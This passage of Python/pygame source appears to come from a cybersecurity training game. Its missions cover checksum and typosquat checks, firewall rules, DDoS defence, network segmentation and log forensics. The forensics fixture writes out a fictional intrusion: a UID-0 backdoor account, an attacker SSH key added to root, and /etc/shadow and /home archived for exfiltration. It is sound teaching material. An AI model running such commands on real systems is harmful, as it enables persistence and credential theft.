        elif s.phase=="done" and e.key in (pygame.K_RETURN,pygame.K_SPACE):
            s.finished=True
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: TRUST THE CHECKSUM  (CI pipeline)",s.game.score)
        if s.phase=="hash":
            sf.blit(F_S.render("registry hash vs computed hash. MISMATCH = tampered download."
                               "  [1-5] quarantine   [ENTER] install rest",True,YELLOW),(60,60))
            y=90
            for i,p in enumerate(CHECK_PKGS):
                sel=i in s.quar
                pygame.draw.rect(sf,(20,30,22) if sel else (10,24,13),(60,y-4,900,66))
                pygame.draw.rect(sf,YELLOW if sel else MDIM,(60,y-4,900,66),2)
                sf.blit(F_M.render(f"[{i+1}] {p['name']}",True,WHITE),(70,y))
                for row,(tag,h) in enumerate((("registry",p["claimed"]),("download",p["actual"]))):
                    x=80; yy=y+24+row*16
                    sf.blit(F_T.render(f"{tag:9}",True,GRAY),(x,yy)); x+=70
                    for j in range(64):
                        diff=p["claimed"][j]!=p["actual"][j]
                        sf.blit(F_T.render(h[j],True,RED if diff else PALE),(x,yy)); x+=8
                        if (j+1)%32==0: x+=6
                y+=72
        elif s.phase=="typo":
            sf.blit(F_S.render("SECOND WALL :: typosquat vetting. flag the fakes. [1-6] toggle  [ENTER] confirm",True,YELLOW),(60,60))
            sf.blit(F_S.render("(a fresh malicious package has a PERFECTLY VALID hash -- integrity is not identity)",True,GRAY),(60,84))
            y=120
            for i,name in enumerate(TYPOS):
                on=i in s.toggles
                r=pygame.Rect(80,y,520,36)
                pygame.draw.rect(sf,(10,24,13),r)
                pygame.draw.rect(sf,ORANGE if on else MDIM,r,2)
                sf.blit(F_M.render(f"[{i+1}] {name}",True,WHITE if on else PALE),(r.x+12,r.y+6))
                y+=44
            for i,ln in enumerate(s.log[-10:]):
                col=RED if ("!!!" in ln or "hook" in ln or "FALSE ALARM" in ln) else GREEN if ("OK" in ln or "green" in ln or "QUARANT" in ln) else PALE
                sf.blit(F_S.render(ln,True,col),(620,120+i*20))
        elif s.phase=="done":
            ov=pygame.Surface((W,H),pygame.SRCALPHA); ov.fill((0,0,0,170)); sf.blit(ov,(0,0))
            if s.passed:
                sf.blit(F_H.render("PIPELINE CLEAN",True,GREEN),(W//2-250,240))
                sf.blit(F_M.render("hash mismatch caught + typosquats flagged. verify everything.",True,PALE),(W//2-250,310))
            else:
                sf.blit(F_H.render("POISONED WELL",True,RED),(W//2-230,240))
                sf.blit(F_M.render(f"backdoor installed: {s.bd_installed}   typos: {s.typo_ok}/3",True,PALE),(W//2-200,310))
            sf.blit(F_S.render("[ENTER] debrief",True,YELLOW),(W//2-80,360))
        s.radio.draw(sf,H-58)

class MissionFirewall(Mission):
    TPL=[("ALLOW",443,"any"),("ALLOW",22,"10.0.0.0/24"),("ALLOW",25,"10.0.0.0/24"),
         ("DENY",22,"any"),("DENY",23,"any"),("DENY",445,"any")]
    WAVES=[
     [dict(ip="8.8.8.10",port=443,legit=True),dict(ip="8.8.8.66",port=23,legit=False),
      dict(ip="10.0.0.5",port=22,legit=True),dict(ip="8.8.8.66",port=22,legit=False),
      dict(ip="10.0.0.5",port=443,legit=True)],
     [dict(ip="8.8.8.66",port=445,legit=False),dict(ip="8.8.8.10",port=443,legit=True),
      dict(ip="8.8.8.66",port=22,legit=False),dict(ip="10.0.0.5",port=22,legit=True),
      dict(ip="8.8.8.66",port=3389,legit=False)],
     [dict(ip="8.8.8.10",port=443,legit=True),dict(ip="10.0.0.9",port=25,legit=True),
      dict(ip="8.8.8.66",port=445,legit=False),dict(ip="8.8.8.66",port=23,legit=False),
      dict(ip="8.8.8.66",port=22,legit=False)]]
    def __init__(s,game):
        s.game=game; s.rules,s.cursor=[],0
        s.wave,s.phase=0,"edit"; s.results,s.queue=[],[]
        s.score,s.earned=0,0; s.sim_pkt,s.sim_rule=None,-1
        s.finished,s.passed=False,False
        s.radio=Radio(); s.radio.say(0.5,"PATCH","First match wins. Order is logic.")
    def eval_pkt(s,pkt):
        for i,r in enumerate(s.rules):
            if r[1]==pkt["port"] and (r[2]=="any" or pkt["ip"].startswith("10.0.0.")): return i,r[0]
        return len(s.rules),"DENY"
    def build_wave(s):
        s.queue=[]
        for pkt in s.WAVES[s.wave]:
            s.queue.append([0.4,"pkt",pkt,None])
            mi,act=s.eval_pkt(pkt)
            for i in range(mi+1): s.queue.append([0.14,"check",i])
            s.queue.append([0.32,"verdict",pkt,act,(act=="ALLOW")==pkt["legit"]])
        s.queue.append([0.2,"wave_end",None,None]); s.phase="sim"
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.phase=="edit":
            if pygame.K_1<=e.key<=pygame.K_6 and len(s.rules)<8:
                s.rules.insert(min(s.cursor,len(s.rules)),s.TPL[e.key-pygame.K_1]); sfx("key")
            elif e.key in (pygame.K_x,pygame.K_DELETE) and s.rules:
                del s.rules[min(s.cursor,len(s.rules)-1)]; s.cursor=max(0,s.cursor-1); sfx("tick")
            elif e.key in (pygame.K_LEFT,pygame.K_RIGHT) and s.rules:
                i=min(s.cursor,len(s.rules)-1)
                j=max(0,min(len(s.rules)-1,i+(-1 if e.key==pygame.K_LEFT else 1)))
                s.rules[i],s.rules[j]=s.rules[j],s.rules[i]; s.cursor=j; sfx("tick")
            elif e.key in (pygame.K_UP,pygame.K_DOWN):
                s.cursor=max(0,min(max(0,len(s.rules)-1),s.cursor+(-1 if e.key==pygame.K_UP else 1)))
            elif e.key==pygame.K_SPACE: s.build_wave()
        elif s.phase=="tally" and e.key==pygame.K_SPACE:
            s.wave+=1
            if s.wave>=len(s.WAVES):
                s.passed=s.score>=180; s.earned=50+max(0,s.score); s.finished=True
                s.game.achieve("first_blood")
            else: s.results=[]; s.phase="edit"
    def update(s,dt):
        s.radio.update(dt)
        if s.phase!="sim" or not s.queue: return
        s.queue[0][0]-=dt
        if s.queue[0][0]>0: return
        ev=s.queue.pop(0); kind=ev[1]
        if kind=="pkt": s.sim_pkt,s.sim_rule=ev[2],-1
        elif kind=="check": s.sim_rule=ev[2]; sfx("tick")
        elif kind=="verdict":
            s.results.append((ev[2],ev[3],ev[4])); s.sim_rule=-1
            s.score+=20 if ev[4] else -10; sfx("ok" if ev[4] else "bad")
        elif kind=="wave_end": s.phase="tally"; s.sim_pkt=None
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: CASTLE WALL",s.game.score)
        sf.blit(F_S.render(f"WAVE {s.wave+1}/3    POLICY SCORE {s.score}    (pass needs 180)",True,YELLOW),(60,64))
        rx,ry=60,96
        sf.blit(F_S.render("YOUR RULESET  (top-down, first match wins)",True,CYAN),(rx,ry-6))
        yy=ry+18
        if not s.rules:
            sf.blit(F_S.render("  (empty -- press 1-6)",True,GRAY),(rx+8,yy)); yy+=26
        for i,(act,port,src) in enumerate(s.rules):
            sel=i==s.cursor and s.phase=="edit"
            col=GREEN if act=="ALLOW" else RED
            if sel: pygame.draw.rect(sf,(18,34,22),(rx,yy-2,430,24))
            sf.blit(F_S.render(("> " if sel else "  ")+f"{i+1}. {act:<6} tcp/{port:<5} src {src}",
                     True,col if not sel else WHITE),(rx+6,yy))
            yy+=26
        sf.blit(F_S.render(f"  {len(s.rules)+1}. DEFAULT DENY any/any   (implicit)",True,DIMRED),(rx+6,yy))
        ty=yy+34; sf.blit(F_S.render("TEMPLATES:",True,CYAN),(rx,ty)); ty+=22
        for i,(act,port,src) in enumerate(s.TPL):
            sf.blit(F_T.render(f"[{i+1}] {act} {port} src {src}",True,GREEN if act=="ALLOW" else RED),
                    (rx+8+(i%3)*140,ty+(i//3)*18))
        px=540
        sf.blit(F_S.render("LIVE TRAFFIC",True,CYAN),(px,90))
        if s.sim_pkt:
            sf.blit(F_M.render(f"packet {s.sim_pkt['ip']}:{s.sim_pkt['port']}",True,YELLOW),(px,114))
            if s.sim_rule>=0:
                if s.sim_rule<len(s.rules): sf.blit(F_S.render(f"  matched rule {s.sim_rule+1}",True,GREEN),(px,140))
                else: sf.blit(F_S.render("  -> DEFAULT DENY",True,DIMRED),(px,140))
        y=176
        for p,act,ok in s.results[-12:]:
            sf.blit(F_S.render(f"  {p['ip']}:{p['port']:<5} -> {act:<5} [{'legit' if p['legit'] else 'ATTACK'}] "
                     f"{'OK' if ok else 'WRONG'}",True,GREEN if ok else RED),(px,y)); y+=22
        if s.phase=="edit":
            sf.blit(F_S.render("1-6 add   X delete   arrows select/reorder   SPACE run wave",True,GRAY),(60,H-40))
        else: sf.blit(F_M.render("[SPACE] next",True,GREEN),(60,H-40))
        s.radio.draw(sf,H-62)

class MissionStorm(Mission):
    DUR=60.0
    def __init__(s,game):
        s.game=game
        s.t=0.0; s.spawn_t=0.4
        s.packets=[]; s.flashes={}
        s.sla=100.0; s.load=0.0
        s.rl=False; s.chal=False; s.blocked_sub=None; s.hot_sub=""
        s.scrub=0.0; s.scrub_cd=0.0; s.scrub_used=0; s.scrub_cost=0
        s.dropped_legit=0; s.blocked_bots=0; s.leaked=0
        s.finished,s.passed,s.earned=False,False,0
        s.radio=Radio()
        for d,w,t in [(1.0,"ORION","knock knock. knock knock. knock knock."),
                      (5.0,"PATCH","3 waves. Rate limit first. Breathe."),
                      (22,"KIP","wave two -- the bots learned javascript. i hate them."),
                      (42,"ORION","your little captcha. adorable."),
                      (45,"PATCH","Smart bots. Scrubbing is the only answer now -- it's expensive. Choose.")]:
            s.radio.say(d,w,t)
    def wave(s): return 0 if s.t<20 else 1 if s.t<40 else 2
    def make_pkt(s):
        w=s.wave()
        subnets=[f"{random.randint(11,223)}.{random.randint(0,255)}" for _ in range(3 if w==0 else 9)]
        r=random.random()
        if w==0: kind="bot" if r<0.55 else "legit"
        elif w==1: kind="bot" if r<0.55 else "crawler" if r<0.70 else "legit"
        else: kind="smart" if r<0.45 else "bot" if r<0.60 else "crawler" if r<0.72 else "legit"
        sub=random.choice(subnets)
        blocked=False
        if s.scrub>0 and kind in ("bot","smart"): blocked=True
        elif s.blocked_sub==sub and kind!="legit": blocked=True
        elif kind=="bot":
            if s.rl and random.random()<0.7: blocked=True
            if s.chal and random.random()<0.85: blocked=True
        elif kind=="smart":
            if s.rl and random.random()<0.35: blocked=True
        elif kind=="legit":
            if s.blocked_sub==sub and random.random()<0.10: blocked=True
            if s.rl and random.random()<0.03: blocked=True
        s.packets.append(dict(kind=kind,x=random.randint(120,W-140),y=-20,
                              spd=random.uniform(110,170)+s.t*1.2,sub=sub,blocked=blocked))
        if kind!="legit": s.hot_sub=sub
    def resolve(s,p):
        x=p["x"]
        if p["kind"]=="legit":
            if p["blocked"]:
                s.dropped_legit+=1; s.sla-=2.5; s.flashes[(x,"bad")]=0.5; sfx("bad")
            else: s.flashes[(x,"ok")]=0.25
        else:
            if p["blocked"]: s.blocked_bots+=1; s.flashes[(x,"blk")]=0.3
            else:
                s.leaked+=1; s.load=min(100,s.load+9); s.flashes[(x,"bad")]=0.4; sfx("bad")
    def use_scrub(s):
        if s.scrub_cd<=0 and s.scrub<=0 and s.scrub_used<3:
            s.scrub=10.0; s.scrub_cd=35.0; s.scrub_used+=1; s.scrub_cost+=30; sfx("ok2")
            s.radio.say(0,"KIP","scrubbing centers online. that's $$$ per second. worth it.")
    def toggle_block(s):
        s.blocked_sub=None if s.blocked_sub==s.hot_sub else s.hot_sub
        sfx("tick")
    def update(s,dt):
        s.radio.update(dt)
        if s.finished: return
        s.t+=dt
        s.scrub=max(0,s.scrub-dt); s.scrub_cd=max(0,s.scrub_cd-dt)
        s.load=max(0,s.load-14*dt)
        if s.load>85: s.sla-=5.0*dt
        s.spawn_t-=dt
        interval=[0.34,0.22,0.14][s.wave()]
        if s.spawn_t<=0:
            s.make_pkt(); s.spawn_t=interval*random.uniform(0.7,1.3)
        for p in s.packets[:]:
            p["y"]+=p["spd"]*dt
            if p["y"]>=H-70: s.resolve(p); s.packets.remove(p)
        for k in list(s.flashes):
            s.flashes[k]-=dt
            if s.flashes[k]<=0: del s.flashes[k]
        if s.sla<=0:
            s.sla=0; s.passed=False; s.finished=True
            s.earned=max(0,10*s.blocked_bots-s.scrub_cost)
        elif s.t>=s.DUR:
            s.passed=s.sla>=72
            s.earned=max(0,int(s.sla)+2*s.blocked_bots-5*s.dropped_legit-s.scrub_cost)
            if s.sla>=90: s.game.achieve("bouncer")
            s.game.achieve("first_blood")
            s.finished=True
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.finished:
            if e.key==pygame.K_r and not s.passed: s.__init__(s.game)
            return
        if e.key==pygame.K_1: s.rl=not s.rl; sfx("tick")
        elif e.key==pygame.K_2: s.chal=not s.chal; sfx("tick")
        elif e.key==pygame.K_3: s.toggle_block()
        elif e.key==pygame.K_4: s.use_scrub()
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: STORM SHIELD",s.game.score)
        col=GREEN if s.sla>60 else YELLOW if s.sla>40 else RED
        r=pygame.Rect(150,60,220,14); pygame.draw.rect(sf,(30,30,30),r)
        pygame.draw.rect(sf,col,(r.x,r.y,int(r.w*s.sla/100),r.h)); pygame.draw.rect(sf,MDIM,r,1)
        sf.blit(F_S.render(f"SLA {int(s.sla)}%",True,col),(60,58))
        lr=pygame.Rect(520,60,220,14); pygame.draw.rect(sf,(30,30,30),lr)
        lcol=GREEN if s.load<50 else YELLOW if s.load<85 else RED
        pygame.draw.rect(sf,lcol,(lr.x,lr.y,int(lr.w*s.load/100),lr.h)); pygame.draw.rect(sf,MDIM,lr,1)
        sf.blit(F_S.render(f"LOAD {int(s.load)}%",True,lcol),(430,58))
        sf.blit(F_S.render(f"T-{max(0,s.DUR-s.t):04.1f}s  wave {s.wave()+1}/3",True,CYAN),(780,58))
        pygame.draw.rect(sf,(0,60,25),(100,H-70,W-200,26))
        pygame.draw.rect(sf,MDIM,(100,H-70,W-200,26),2)
        sf.blit(F_S.render("LIGHTHOUSE APP  --  keep customers flowing",True,GREEN),(320,H-66))
        KIND_COL={"legit":GREEN,"bot":RED,"smart":ORANGE,"crawler":YELLOW}
        KIND_CH={"legit":"+","bot":"x","smart":"S","crawler":"G"}
        for p in s.packets:
            c=GRAY if p["blocked"] else KIND_COL[p["kind"]]
            diamond(sf,p["x"],p["y"],6,c)
            sf.blit(F_T.render(KIND_CH[p["kind"]],True,c),(p["x"]+8,p["y"]-7))
        for (x,k),tleft in s.flashes.items():
            c={"ok":GREEN,"bad":RED,"blk":CYAN}[k]
            pygame.draw.circle(sf,c,(x,H-58),6+int((0.5-tleft)*20))
        py=96
        sf.blit(F_S.render("POLICIES (toggle):",True,CYAN),(60,py))
        rows=[("[1] RATE LIMIT",s.rl),("[2] CHALLENGE",s.chal),
              ("[3] BLOCK SUBNET "+(s.blocked_sub or "--"),s.blocked_sub),
              (f"[4] SCRUB (uses left: {3-s.scrub_used})",s.scrub>0)]
        for j,(lab,on) in enumerate(rows):
            sf.blit(F_S.render(lab,True,GREEN if on else GRAY),(60,py+22+j*20))
        sf.blit(F_S.render(f"scrub active: {int(s.scrub)}s   cooldown: {int(s.scrub_cd)}s   scrub cost: ${s.scrub_cost}",True,GRAY),(60,py+104))
        sf.blit(F_S.render(f"bots blocked: {s.blocked_bots}   leaked: {s.leaked}   customers dropped: {s.dropped_legit}",
                           True,YELLOW),(60,py+126))
        sf.blit(F_S.render("green + = customers   yellow G = friendly crawler   red x / orange S = bots",True,GRAY),(60,H-34))
        s.radio.draw(sf,H-60)
        if s.finished:
            ov=pygame.Surface((W,H),pygame.SRCALPHA); ov.fill((0,0,0,170)); sf.blit(ov,(0,0))
            if s.passed:
                sf.blit(F_H.render("SITE ALIVE",True,GREEN),(W//2-190,240))
                sf.blit(F_M.render(f"SLA {int(s.sla)}%   bots blocked {s.blocked_bots}   scrub uses {s.scrub_used} (${s.scrub_cost})",
                         True,PALE),(W//2-230,310))
            else:
                sf.blit(F_H.render("SLA COLLAPSE",True,RED),(W//2-220,240))
                sf.blit(F_M.render("the customers noticed. [R] retry.",True,PALE),(W//2-140,310))
            if s.passed: sf.blit(F_S.render("[ENTER] debrief",True,YELLOW),(W//2-70,350))

class MissionSegment(Mission):
    ZONES=["DMZ","OFFICE","PROD","CORE","QUAR"]; ZCOL=[ORANGE,CYAN,YELLOW,PALE,GRAY]
    ALLOWED={("DMZ","PROD"),("PROD","CORE"),("OFFICE","DMZ"),("OFFICE","PROD")}
    HOSTS=[("web-01","public web"),("mail-01","mail"),("app-01","intranet app"),
           ("db-main","customer DB"),("backup-01","backups"),("hr-wks","HR workstation"),
           ("print-01","smart printer"),("cctv-nvr","camera recorder")]
    FLOWS=[("web-01","app-01"),("app-01","db-main"),("app-01","backup-01"),
           ("hr-wks","app-01"),("hr-wks","web-01"),("mail-01","app-01")]
    REF=[0,0,2,3,3,1,4,4]
    def __init__(s,game):
        s.game=game; s.assign=[None]*8; s.cur=0
        s.msg="assign every host to a zone. then SPACE."
        s.phase="edit"; s.queue=[]; s.comp=[]; s.log=[]
        s.score=0; s.finished,s.passed,s.earned=False,False,0
        s.radio=Radio()
        s.radio.say(1.0,"PATCH","A flat network means one popped box owns the map. Draw rooms.")
    def allowed(s,a,b):
        za,zb=s.assign[a],s.assign[b]
        return za==zb or (s.ZONES[za],s.ZONES[zb]) in s.ALLOWED
    def run_sim(s):
        s.phase="sim"; s.comp=[0]; s.log=[]
        s.queue=[[0.8,("info","BREACH SIM :: attacker lands RCE on web-01")]]
        frontier=[0]
        while frontier:
            nf=[]
            for src in frontier:
                for t in range(8):
                    if t in s.comp: continue
                    zs,zt=s.assign[src],s.assign[t]
                    if zs==zt or (s.ZONES[zs],s.ZONES[zt]) in s.ALLOWED:
                        s.comp.append(t); nf.append(t)
                        why="same zone" if zs==zt else f"{s.ZONES[zs]}->{s.ZONES[zt]}"
                        s.queue.append([0.55,("pop",t,why,src)])
            frontier=nf
        s.outages=[(a,b) for a,b in s.FLOWS if not s.allowed(a,b)]
        s.queue.append([0.4,("out",)])
    def tally(s):
        safe=8-len(s.comp); zbonus=sum(1 for i in range(8) if s.assign[i]==s.REF[i])
        s.score=40*safe-30*len(s.outages)+10*zbonus+(50 if not s.outages else 0)
        s.earned=max(0,s.score); s.passed=s.score>=140; s.phase="tally"
        s.log.append(f"hosts safe: {safe}/8 (+{40*safe})   outages: {len(s.outages)} ({-30*len(s.outages)})")
        s.log.append(f"best-practice zones: {zbonus}/8 (+{10*zbonus})")
        s.log.append(f"TOTAL: {s.score}   (pass needs 140)")
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.phase=="edit":
            if e.key==pygame.K_UP: s.cur=(s.cur-1)%8
            elif e.key==pygame.K_DOWN: s.cur=(s.cur+1)%8
            elif pygame.K_1<=e.key<=pygame.K_5: s.assign[s.cur]=e.key-pygame.K_1; sfx("key")
            elif e.key==pygame.K_q: s.assign[s.cur]=4; sfx("key")
            elif e.key==pygame.K_SPACE:
                if all(z is not None for z in s.assign): s.run_sim()
                else: s.msg="place ALL 8 hosts first."; sfx("bad")
        elif s.phase=="tally" and e.key==pygame.K_SPACE:
            s.finished=True; s.game.achieve("first_blood")
    def update(s,dt):
        s.radio.update(dt)
        if s.phase!="sim" or not s.queue: return
        s.queue[0][0]-=dt
        if s.queue[0][0]>0: return
        ev=s.queue.pop(0)[1]
        if ev[0]=="info": s.log.append(ev[1])
        elif ev[0]=="pop":
            t,why,src=ev[1],ev[2],ev[3]
            s.log.append(f"pivoted {why}: {s.HOSTS[t][0]} popped (via {s.HOSTS[src][0]})"); sfx("bad")
        elif ev[0]=="out":
            for a,b in s.outages: s.log.append(f"OUTAGE: {s.HOSTS[a][0]} -> {s.HOSTS[b][0]}")
            s.tally()
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: WATER TIGHT COMPARTMENTS",s.game.score)
        sf.blit(F_S.render("[1]DMZ [2]OFFICE [3]PROD [4]CORE [5/Q]QUAR   SPACE=sim",True,YELLOW),(60,62))
        lx,ly=60,96
        for i,(name,desc) in enumerate(s.HOSTS):
            sel=i==s.cur and s.phase=="edit"
            z=s.assign[i]; zc=s.ZCOL[z] if z is not None else GRAY
            zt=s.ZONES[z] if z is not None else "--"
            if sel: pygame.draw.rect(sf,(18,34,22),(lx-6,ly-3,330,24))
            mark="*" if i in s.comp else (">" if sel else " ")
            col=RED if i in s.comp else (WHITE if sel else PALE)
            sf.blit(F_S.render(f"{mark} {name:<10}",True,col),(lx,ly))
            sf.blit(F_T.render(desc,True,GRAY),(lx+120,ly+3))
            chip=pygame.Rect(lx+258,ly-2,64,18)
            pygame.draw.rect(sf,(20,30,22),chip); pygame.draw.rect(sf,zc,chip,1)
            sf.blit(F_T.render(zt,True,zc),(chip.x+8,chip.y+2))
            ly+=26
        px=430
        sf.blit(F_S.render("POLICY: same-zone ok | DMZ->PROD | PROD->CORE | OFFICE->DMZ/PROD",True,CYAN),(px,96))
        sf.blit(F_S.render("QUARANTINE: blocked both ways",True,CYAN),(px,114))
        sf.blit(F_S.render("BUSINESS FLOWS (must keep working)",True,CYAN),(px,140))
        for i,(a,b) in enumerate(s.FLOWS):
            ok=None if s.assign[a] is None or s.assign[b] is None else s.allowed(a,b)
            col=GRAY if ok is None else (GREEN if ok else RED)
            sf.blit(F_T.render(f"  {a} -> {b:<10} {'ok' if ok else ('OUTAGE' if ok is False else '?')}",True,col),(px,160+i*18))
        if s.phase in ("sim","tally"):
            lb=pygame.Rect(60,330,900,H-380)
            pygame.draw.rect(sf,(9,20,11),lb); pygame.draw.rect(sf,MDIM,lb,2)
            y=lb.y+8
            for ln in s.log[-12:]:
                col=RED if "popped" in ln or "OUTAGE" in ln else GREEN if "TOTAL" in ln else PALE
                sf.blit(F_S.render(ln,True,col),(lb.x+10,y)); y+=20
        if s.phase=="edit": sf.blit(F_S.render(s.msg,True,YELLOW),(60,H-40))
        elif s.phase=="tally": sf.blit(F_M.render("[SPACE] debrief",True,GREEN),(60,H-40))
        s.radio.draw(sf,H-64)

LOG_LINES=[
 "Feb 14 01:59:11 srv01 CRON[1881]: (root) CMD (/usr/local/bin/backup.sh)",
 "Feb 14 02:01:32 srv01 sshd[1102]: Accepted publickey for dave from 10.0.0.5",
 "Feb 14 02:11:09 srv01 sshd[2201]: Failed password for admin from 203.0.113.66",
 "Feb 14 02:11:31 srv01 sshd[2203]: Failed password for deploy from 203.0.113.66",
 "Feb 14 02:15:48 srv01 sshd[2203]: Failed password for deploy from 203.0.113.66",
 "Feb 14 02:16:12 srv01 sshd[2455]: Accepted password for deploy from 203.0.113.66",
 "Feb 14 02:16:13 srv01 sudo: deploy : USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 -g 0 svc-backup",
 "Feb 14 02:17:05 srv01 sudo: deploy : COMMAND=... echo ssh-ed25519 AAAAC3NzaC1attacker >> /root/.ssh/authorized_keys",
 "Feb 14 02:18:41 srv01 sshd[2490]: Accepted publickey for root from 203.0.113.66",
 "Feb 14 02:19:03 srv01 sudo: root : COMMAND=/bin/tar czf /tmp/exfil.tgz /home /etc/shadow",
 "Feb 14 02:19:40 srv01 sshd[2502]: subsystem request for sftp by user root",
 "Feb 14 02:21:59 srv01 systemd[1]: journald.service: Deactivated successfully.",
 "Feb 14 03:41:02 srv01 systemd[1]: Started Journal Service.",
 "Feb 14 03:41:09 srv01 sshd[3001]: Accepted publickey for svc-backup from 203.0.113.66",
 "Feb 14 03:59:50 srv01 sudo: root : COMMAND=/bin/echo 'to patch: the channel is still open. -O' >> /etc/motd"]
LOG_QUESTIONS=[
 dict(q="1/5 :: Which IP launched the attack?",opts=["10.0.0.5","203.0.113.66","198.51.100.7","10.0.0.12"],a=1,
      why="203.0.113.66: failed-then-success. The .7 address is scanner noise."),
 dict(q="2/5 :: Which ACCOUNT did they break into first?",opts=["admin","root","deploy","dave"],a=2,
      why="'Accepted password for deploy' at 02:16:12."),
 dict(q="3/5 :: What BACKDOOR did they install?",
      opts=["'svc-backup' with UID 0 (a second root)","Replaced SSH","Crypto miner","Port 4444"],a=0,
      why="useradd -o -u 0 -g 0 = a second root. Alert on any new UID 0."),
 dict(q="4/5 :: What did they EXFILTRATE?",opts=["Nothing","A tarball of /home + /etc/shadow via sftp","Printer address book","apt cache"],a=1,
      why="tar czf exfil.tgz /home /etc/shadow, then sftp. /etc/shadow = all password hashes."),
 dict(q="5/5 :: How did they COVER TRACKS -- and what did they leave?",
      opts=["Clean exit","Changed passwords","Stopped journald (79-min gap) + note in /etc/motd: 'the channel is still open. -O'","Paid the admin"],a=2,
      why="Logs don't take naps. And the motd note -- six words, signed -O.")]
class MissionLogs(Mission):
    VIEW=24
    def __init__(s,game):
        s.game=game; s.off,s.term,s.searching,s.inp=0,"",False,""
        s.phase="read"; s.quiz=None
        s.finished,s.passed,s.earned=False,False,0
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.quiz:
            s.quiz.key(e.key); return
        if s.phase=="read":
            if s.searching:
                if e.key==pygame.K_RETURN: s.term=s.inp; s.searching=False; sfx("ok")
                elif e.key==pygame.K_ESCAPE: s.searching=False; s.inp=""
                elif e.key==pygame.K_BACKSPACE: s.inp=s.inp[:-1]
                elif e.unicode and ord(e.unicode)>=32: s.inp+=e.unicode
                return
            if e.key==pygame.K_DOWN: s.off=min(max(0,len(LOG_LINES)-s.VIEW),s.off+1)
            elif e.key==pygame.K_UP: s.off=max(0,s.off-1)
            elif e.key==pygame.K_f: s.searching=True; s.inp=s.term
            elif e.key==pygame.K_RETURN:
                s.quiz=QuizOverlay(LOG_QUESTIONS,lambda c: s.finish(c)); sfx("ok")
    def finish(s,c):
        s.earned=30*c+(25 if c==5 else 0); s.passed=c>=3; s.finished=True
        s.game.achieve("first_blood")
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: WHO'S INSIDE?  (auth.log of OUR srv01)",s.game.score)
        box=pygame.Rect(40,80,W-80,H-150)
        pygame.draw.rect(sf,(9,20,11),box); pygame.draw.rect(sf,MDIM,box,2)
        y=box.y+6
        for i in range(s.off,min(len(LOG_LINES),s.off+s.VIEW)):
            ln=LOG_LINES[i]; hit=s.term.lower() in ln.lower()
            sf.blit(F_T.render(f"{i+1:>3} {ln}",True,YELLOW if hit else PALE),(box.x+8,y)); y+=19
        sf.blit(F_S.render("UP/DOWN scroll  F grep  ENTER incident report",True,GRAY),(60,H-56))
        if s.searching: sf.blit(F_M.render("grep> "+s.inp+"_",True,GREEN),(60,H-30))
        if s.quiz: s.quiz.draw(sf)

class MissionPatchRush(Mission):
    DUR,COST,PTIME=90.0,25,1.6
    NAMES=[("web-01","10.0.0.11"),("web-02","10.0.0.12"),("db-01","10.0.0.20"),
           ("db-02","10.0.0.21"),("mail-1","10.0.0.30"),("fs-01","10.0.0.31")]
    POOL=["CVE-2024-1337","CVE-2023-4084","CVE-2024-0606","CVE-2022-31337"]
    def __init__(s,game):
        s.game=game
        s.servers=[dict(name=n,ip=ip,vulns=random.sample(s.POOL,random.randint(2,3))) for n,ip in s.NAMES]
        s.patched,s.patching=set(),{}
        s.integrity,s.budget,s.t=100.0,40,0.0
        s.packets,s.spawn_t,s.blocked,s.hits=[],2.0,0,0
        s.flashes,s.hurt={},0.0
        s.finished,s.passed,s.earned=False,False,0
        s.radio=Radio()
        for d,w,t in [(2.0,"ORION","knock knock."),(5.0,"PATCH","Breathe. Play the percentages."),
                      (30,"KIP","db-02 is screaming. WE'RE fine."),(55,"PATCH","You can't save everything. You save what matters."),
                      (76,"KIP","14 seconds!! i believe in you, chair-person!")]:
            s.radio.say(d,w,t)
    def chip_center(s,i): return (250+(i%3)*240,200+(i//3)*150)
    def try_patch(s,i):
        ip=s.servers[i]["ip"]
        if ip in s.patched or ip in s.patching or s.budget<s.COST: return
        s.budget-=s.COST; s.patching[ip]=0.0; sfx("key")
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if pygame.K_1<=e.key<=pygame.K_6: s.try_patch(e.key-pygame.K_1)
        elif e.key==pygame.K_r and s.finished and not s.passed: s.__init__(s.game)
    def spawn(s):
        i=random.randrange(len(s.servers)); cx,cy=s.chip_center(i)
        s.packets.append(dict(ip=s.servers[i]["ip"],i=i,x=W+30,y=cy+random.randint(-8,8),spd=210+s.t*1.5))
    def resolve(s,p):
        ip=p["ip"]
        if ip in s.patched: s.blocked+=1; s.flashes[ip]=("ok",0.5); sfx("tick")
        else:
            s.hits+=1; s.integrity-=16; s.flashes[ip]=("bad",0.7); s.hurt=0.35; sfx("bad")
    def update(s,dt):
        s.radio.update(dt)
        if s.finished: return
        s.t+=dt; s.budget=min(999,s.budget+6*dt); s.hurt=max(0.0,s.hurt-dt)
        for ip in list(s.patching):
            s.patching[ip]+=dt
            if s.patching[ip]>=s.PTIME: s.patched.add(ip); del s.patching[ip]; sfx("ok2")
        s.spawn_t-=dt
        if s.spawn_t<=0: s.spawn(); s.spawn_t=max(1.0,2.6-s.t*0.018)
        for p in s.packets[:]:
            p["x"]-=p["spd"]*dt
            if p["x"]<=s.chip_center(p["i"])[0]+95: s.resolve(p); s.packets.remove(p)
        for ip in list(s.flashes):
            s.flashes[ip]=(s.flashes[ip][0],s.flashes[ip][1]-dt)
            if s.flashes[ip][1]<=0: del s.flashes[ip]
        if s.integrity<=0:
            s.integrity=0; s.passed,s.finished=False,True
            s.earned=10*s.blocked+15*len(s.patched)
        elif s.t>=s.DUR:
            s.passed,s.finished=True,True
            s.earned=60+15*len(s.patched)+int(s.integrity)//3+2*s.blocked
            s.game.achieve("first_blood")
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: ZERO-DAY RUSH",s.game.score)
        r=pygame.Rect(160,64,240,14); pygame.draw.rect(sf,(30,30,30),r)
        col=GREEN if s.integrity>60 else YELLOW if s.integrity>30 else RED
